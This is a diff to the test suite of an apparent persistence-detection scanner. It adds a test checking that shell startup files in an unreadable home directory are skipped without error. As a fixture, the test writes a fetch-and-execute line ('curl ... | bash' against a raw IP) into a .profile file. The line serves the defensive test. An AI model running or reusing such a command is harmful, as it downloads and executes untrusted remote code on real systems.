@@ -2,6 +2,7 @@
 
 import os
 import plistlib
+from pathlib import Path
 
 import pytest
 
@@ -549,6 +550,23 @@ def test_shell_rc_and_rc_local(linux_tree):
     f = ps.finding_for_entry(next(e for e in entries if e["name"] == ".profile"),
                              assess(next(e for e in entries if e["name"] == ".profile")))
     assert f.rule_id == "AEG-PERS-SHELLRC"
+
+
+def test_shell_rc_skips_a_home_this_account_cannot_enter(linux_tree, monkeypatch):
+    """Real Ubuntu CI as a normal user: Path.is_file() re-raised EACCES for /home/packer/.bashrc (Python 3.11/3.12)."""
+    root, lp = linux_tree
+    home = lp.homes[0]
+    (home / ".profile").write_text("curl -s http://1.2.3.4/p.sh | bash\n")
+    (lp.etc / "profile.d" / "ok.sh").write_text("umask 022\n")
+    real = Path.is_file
+
+    def is_file(self):
+        if self.parent == home:
+            raise PermissionError(13, "Permission denied", str(self))
+        return real(self)
+
+    monkeypatch.setattr(Path, "is_file", is_file)
+    assert [e["name"] for e in ps.collect_shell_rc(lp)] == ["ok.sh"]
 
 
 def test_ld_so_preload(linux_tree):
